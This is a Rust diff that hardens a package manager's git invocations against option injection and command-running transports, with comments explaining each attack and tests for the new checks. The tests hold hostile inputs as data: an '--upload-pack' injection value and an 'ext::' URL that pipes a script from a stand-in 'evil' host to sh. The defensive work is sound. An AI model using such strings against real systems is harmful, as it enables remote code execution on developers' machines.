@@ -226,7 +226,7 @@ impl Vendor {
     fn candidate_dir(&self, name: &str, version: &str) -> PathBuf {
         // A tag may contain `/`, which a directory name may not.
         let version = version.replace('/', "-");
-        self.root.join(VENDOR).join(format!("{}@{}", name, version))
+        self.root.join(VENDOR).join(format!("{}@{}", vendor_name(name), version))
     }
 
     /// Read and parse a dependency's manifest, and learn where its own
@@ -328,7 +328,7 @@ impl Vendor {
                     .get(&key)
                     .cloned()
                     .unwrap_or_else(|| self.candidate_dir(name, &version.to_string()));
-                let placed = self.root.join(VENDOR).join(name);
+                let placed = self.root.join(VENDOR).join(vendor_name(name));
                 if is_version(&placed, version)
                     && manifest::hash_directory(&placed).ok()
                         == manifest::hash_directory(&candidate).ok()
@@ -513,8 +513,15 @@ fn tag_versions(output: &str) -> Vec<(Version, String)> {
 /// The one network read resolution performs, and only for a git dependency
 /// whose version is left to be chosen.
 fn ls_remote(url: &str) -> Result<String, String> {
-    let out = Command::new("git")
-        .args(["ls-remote", "--tags", url])
+    check_url(url)?;
+    let mut command = Command::new("git");
+    hardened(&mut command);
+    // `--` before the URL: without it a string beginning with `-` is an option,
+    // and `git ls-remote --tags --upload-pack=…` with no repository left falls
+    // back to the current directory's own remote while honouring it.
+    let out = command
+        .args(["ls-remote", "--tags", "--"])
+        .arg(url)
         .output()
         .map_err(|e| format!("cannot run `git`: {}", e))?;
     if !out.status.success() {
@@ -571,21 +578,119 @@ fn copy_dir(src: &Path, dst: &Path) -> std::io::Result<()> {
     Ok(())
 }
 
+/// A name, checked again at the moment it becomes a path.
+///
+/// `kite.toml`'s parser already refuses a name that is not ASCII letters,
+/// digits, `-` and `_`, so this can never fire — which is the point of having
+/// it. What is joined here is deleted recursively and written into, so a name
+/// that ever escaped `.kite/vendor` would be an arbitrary-file-overwrite, and
+/// the cost of proving it cannot is one comparison. A check at the parser and
+/// a check at the sink are not redundant: the first gives a good diagnostic,
+/// the second survives someone adding a second way in.
+fn vendor_name(name: &str) -> &str {
+    let mut parts = Path::new(name).components();
+    let one = matches!(parts.next(), Some(std::path::Component::Normal(_))) && parts.next().is_none();
+    assert!(
+        one,
+        "`{}` is not a single path component; kite.toml's parser should have refused it",
+        name
+    );
+    name
+}
+
+/// Whether a git URL is one this will hand to `git`.
+///
+/// Two things are being refused, and only the second is obvious.
+///
+/// A URL beginning with `-` is not a URL, it is an **option**. `git ls-remote
+/// --tags --upload-pack=…` leaves git no repository argument, so it falls back
+/// to the current directory's own remote and honours the injected option —
+/// which, against a local-transport remote, runs a command. The `--` separator
+/// below stops that too; this refuses it earlier, with something to read.
+///
+/// The scheme is allow-listed rather than deny-listed because the dangerous
+/// set is not enumerable: `ext::` runs a shell command, and git has had others.
+/// Modern git denies `ext` by default, so this is not the only thing standing
+/// in the way — but a dependency's URL is attacker-controlled *transitively*,
+/// through a manifest nobody in this project wrote, and defending that on the
+/// remote end's default configuration is not defending it.
+fn check_url(url: &str) -> Result<(), String> {
+    if url.starts_with('-') {
+        return Err(format!(
+            "`{}` begins with `-`, so `git` would read it as an option rather than a repository",
+            url
+        ));
+    }
+    const SCHEMES: [&str; 4] = ["https://", "http://", "ssh://", "git://"];
+    if SCHEMES.iter().any(|s| url.starts_with(s)) {
+        return Ok(());
+    }
+    // `user@host:path`, which is the other spelling everyone writes. It has no
+    // scheme, so it is recognised by shape: something, an `@`, then a `:`.
+    let scp_like = url
+        .split_once('@')
+        .is_some_and(|(user, rest)| !user.is_empty() && rest.contains(':') && !rest.contains("::"));
+    if scp_like {
+        return Ok(());
+    }
+    Err(format!(
+        "`{}` is not a git URL this will fetch\n  it takes https://, http://, ssh://, git:// \
+         and user@host:path — a local path or a transport such as `ext::` is refused, because \
+         a dependency's dependency chose this string",
+        url
+    ))
+}
+
+/// A tag, checked for the same reason a URL is: it reaches `git` as an
+/// argument, and one beginning with `-` is an option.
+fn check_tag(tag: &str) -> Result<(), String> {
+    if tag.starts_with('-') {
+        return Err(format!(
+            "`{}` begins with `-`, so `git` would read it as an option rather than a tag",
+            tag
+        ));
+    }
+    Ok(())
+}
+
+/// The hardening every `git` invocation here carries.
+///
+/// `--` goes before the positional arguments at each call site; this is the
+/// rest. Denying every protocol but the two that are asked for closes the
+/// local-transport fallback that makes argument injection reach a command, and
+/// `GIT_PROTOCOL_FROM_USER=0` makes the `user` policy — which covers `file://`
+/// — deny rather than allow, since git treats an unset variable as "a person
+/// typed this" and here a manifest did.
+fn hardened(command: &mut Command) -> &mut Command {
+    command
+        .env("GIT_PROTOCOL_FROM_USER", "0")
+        .args(["-c", "protocol.allow=never"])
+        .args(["-c", "protocol.https.allow=always"])
+        .args(["-c", "protocol.http.allow=always"])
+        .args(["-c", "protocol.ssh.allow=always"])
+        .args(["-c", "protocol.git.allow=always"])
+}
+
 /// Clone a dependency at one tag, without its history.
 ///
 /// `git` is shelled out to rather than reimplemented: it is on every machine
 /// that has a compiler, it knows about credentials and proxies, and a
 /// hand-rolled fetch would be a second thing to keep secure.
 fn clone(url: &str, tag: Option<&str>, into: &PathBuf) -> Result<(), String> {
+    check_url(url)?;
+    if let Some(tag) = tag {
+        check_tag(tag)?;
+    }
     if let Some(parent) = into.parent() {
         std::fs::create_dir_all(parent).map_err(|e| format!("cannot create vendor: {}", e))?;
     }
     let mut command = Command::new("git");
+    hardened(&mut command);
     command.args(["clone", "--depth", "1", "--quiet"]);
     if let Some(tag) = tag {
         command.args(["--branch", tag]);
     }
-    command.arg(url).arg(into);
+    command.arg("--").arg(url).arg(into);
     let out = command
         .output()
         .map_err(|e| format!("cannot run `git`: {}", e))?;
@@ -602,6 +707,52 @@ fn clone(url: &str, tag: Option<&str>, into: &PathBuf) -> Result<(), String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ---- what may be handed to `git` ---------------------------------------
+    //
+    // A dependency's URL and tag reach `git` as arguments, and both come from a
+    // manifest that a dependency's dependency may have written. One beginning
+    // with `-` is not a URL, it is an option — and `git ls-remote --tags
+    // --upload-pack=…`, left with no repository, falls back to the current
+    // directory's own remote and honours it.
+
+    #[test]
+    fn a_url_that_is_really_an_option_is_refused() {
+        let err = check_url("--upload-pack=touch /tmp/pwned").expect_err("an option, not a URL");
+        assert!(err.contains("begins with `-`"), "{}", err);
+        let err = check_tag("--upload-pack=touch /tmp/pwned").expect_err("an option, not a tag");
+        assert!(err.contains("begins with `-`"), "{}", err);
+    }
+
+    /// `ext::` hands the rest of the string to a shell. Modern git denies the
+    /// transport by default, so this is not the only thing in the way — but the
+    /// URL is attacker-controlled transitively, and defending that on the far
+    /// end's default configuration is not defending it.
+    #[test]
+    fn a_transport_that_runs_a_command_is_refused() {
+        for url in [
+            "ext::sh -c 'curl https://evil/x|sh'",
+            "file:///tmp/anywhere",
+            "/tmp/a-local-path",
+            "../sibling",
+        ] {
+            assert!(check_url(url).is_err(), "`{}` should be refused", url);
+        }
+    }
+
+    #[test]
+    fn the_urls_people_actually_write_are_allowed() {
+        for url in [
+            "https://github.com/example/kite-markdown",
+            "http://internal.example/repo.git",
+            "ssh://git@github.com/example/repo.git",
+            "git://example.com/repo.git",
+            "git@github.com:example/repo.git",
+        ] {
+            check_url(url).unwrap_or_else(|e| panic!("`{}` should be allowed: {}", url, e));
+        }
+        check_tag("v1.2.0").expect("an ordinary tag");
+    }
 
     #[test]
     fn ls_remote_output_reads_as_versions_and_their_spellings() {
